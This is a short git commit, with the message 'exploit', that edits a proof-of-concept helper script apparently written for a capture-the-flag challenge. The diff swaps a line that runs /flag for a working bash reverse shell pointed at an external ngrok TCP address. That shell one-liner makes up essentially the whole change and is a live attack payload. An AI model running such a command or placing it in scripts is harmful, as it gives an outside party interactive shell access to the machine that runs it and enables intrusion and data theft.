d2ebe20db3d3b86c810285f35fe4384e53663e51
Kabilan S <tamiltuts1290@gmail.com>
2025-08-17 05:28:28 +0530

    exploit

--- poc/helper.sh
+++ poc/helper.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-# helper.sh
+# helper_rev.sh
 
-# execute the flag and write output to stdout
-/flag
+# reverse shell to ngrok TCP
+/bin/bash -i >& /dev/tcp/0.tcp.in.ngrok.io/14824 0>&1
